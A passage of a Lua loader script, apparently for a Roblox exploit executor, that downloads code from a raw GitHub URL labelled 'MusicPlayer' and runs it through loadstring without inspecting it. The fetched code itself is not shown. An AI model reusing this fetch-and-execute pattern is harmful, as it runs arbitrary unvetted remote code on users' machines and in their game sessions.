    "https://raw.githubusercontent.com/Ekba17/Soundoad/refs/heads/main/MusicPlayer",
}

for _, u in ipairs(urls) do
    if type(u) == "string" and u ~= "" then
        local body
        if request then
            local ok,res = pcall(request, {Url = u, Method = "GET"})
            body = ok and (res.Body or res.body or res)
        elseif type(syn) == "table" and syn.request then
            local ok,res = pcall(syn.request, {Url = u, Method = "GET"})
            body = ok and (res.Body or res.body or res)
        else
            local ok, b = pcall(function() return game:HttpGet(u) end)
            body = ok and b
        end

        if body then
            local fn = loadstring(body)
            if fn then pcall(fn) end
        end
    end
end
